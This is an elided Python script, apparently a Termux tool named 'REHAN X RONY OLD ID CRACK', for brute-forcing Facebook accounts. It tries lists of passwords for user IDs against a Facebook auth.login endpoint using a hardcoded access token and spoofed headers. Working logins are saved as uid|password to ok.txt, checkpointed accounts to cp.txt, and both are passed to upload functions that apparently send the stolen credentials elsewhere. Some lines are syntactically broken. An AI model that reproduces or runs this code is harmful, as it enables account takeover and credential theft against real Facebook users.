...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/R X R/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK :  REHAN MALLIK")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰RONY🔥")
	subprocess.check_output(["am", "start", "https://m.me/100055821998949"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Termux-nihan/RehanxNIHAN/edit/main/RehanxNIHAN.txt').text
			if basesplit in plr:
				key = basesplit
...
╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░                          
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : REHAN MALLIK  
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : 🔰REHAN X RONY TERMUX COMMAND🔰
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : P7TH0N
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +8801981002555
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %saREHAN X RONY OLD ID CRACK"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [R X R_OLD] : %s/%s -> \033[0;92m [ R X R-OK:%s ]- \033[0;91m[R X R-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
            ...
            'x-fb-request-id': 'AqZCfEj4mVXvQSuOtNJhpUf',
            'x-fb-trace-id': 'BkoS+TiL3gF',
            'x-fb-rev': '1007982926',
            'x-fb-debug',: 'hUKaiRRfdYBgemA8tlO5cbVfePT6s4PF5O3ReWvttk7CPS4f2qmUitEFkrkXlIvU0p2SnQhoBRIJVIq4eSyeg==',
            ...
            'user-agent':pro}
			response = ses.get("https://developer.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[R X R-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [R X R-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[R X R-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [R X R-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
